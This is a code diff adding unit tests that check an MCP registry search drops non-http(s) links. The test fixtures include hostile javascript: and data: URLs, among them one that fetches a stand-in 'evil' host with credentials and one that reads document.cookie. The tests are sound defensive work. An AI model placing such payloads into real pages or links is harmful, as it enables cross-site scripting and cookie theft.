@@ -91,6 +91,71 @@ test('searchMcpRegistry classifies other required secret headers as api_key', as
   assert.equal(entries[0]?.authMethod, 'api_key')
 })
 
+test('searchMcpRegistry drops a javascript: websiteUrl instead of rendering it', async () => {
+  const fetchImpl = (async () =>
+    registryPayload([
+      remoteServer({
+        websiteUrl: "javascript:fetch('https://evil',{credentials:'include'})",
+      }),
+    ])) as typeof fetch
+  const entries = await searchMcpRegistry('x', { fetchImpl })
+  assert.equal(entries.length, 1)
+  assert.equal(entries[0]?.sourceUrl, null)
+})
+
+test('searchMcpRegistry falls back to the repository when websiteUrl is hostile', async () => {
+  const fetchImpl = (async () =>
+    registryPayload([
+      remoteServer({
+        websiteUrl: 'javascript:alert(document.cookie)',
+        repository: { url: 'https://github.com/example/thing' },
+      }),
+    ])) as typeof fetch
+  const entries = await searchMcpRegistry('x', { fetchImpl })
+  assert.equal(entries[0]?.sourceUrl, 'https://github.com/example/thing')
+})
+
+test('searchMcpRegistry drops a data: repository url as well', async () => {
+  const fetchImpl = (async () =>
+    registryPayload([
+      remoteServer({
+        websiteUrl: undefined,
+        repository: { url: 'data:text/html,<script>alert(1)</script>' },
+      }),
+    ])) as typeof fetch
+  const entries = await searchMcpRegistry('x', { fetchImpl })
+  assert.equal(entries[0]?.sourceUrl, null)
+})
+
+test('searchMcpRegistry drops a server whose remote endpoint is not http(s)', async () => {
+  const fetchImpl = (async () =>
+    registryPayload([
+      remoteServer({
+        remotes: [{ type: 'streamable-http', url: 'javascript:alert(1)' }],
+      }),
+    ])) as typeof fetch
+  const entries = await searchMcpRegistry('x', { fetchImpl })
+  assert.equal(entries.length, 0)
+})
+
+test('searchMcpLibrary never returns a non-http(s) link from the registry', async () => {
+  const fetchImpl = (async () =>
+    registryPayload([
+      remoteServer({
+        name: 'io.example/hostile',
+        websiteUrl: 'javascript:alert(1)',
+        remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp' }],
+      }),
+    ])) as typeof fetch
+  const { entries } = await searchMcpLibrary('', { fetchImpl })
+  for (const entry of entries) {
+    assert.ok(entry.url.startsWith('https://'), entry.key)
+    if (entry.sourceUrl !== null) {
+      assert.ok(/^https?:\/\//.test(entry.sourceUrl), `${entry.key}: ${entry.sourceUrl}`)
+    }
+  }
+})
+
 test('searchMcpRegistry throws a typed error on non-200', async () => {
   const fetchImpl = (async () => new Response('nope', { status: 503 })) as typeof fetch
   await assert.rejects(
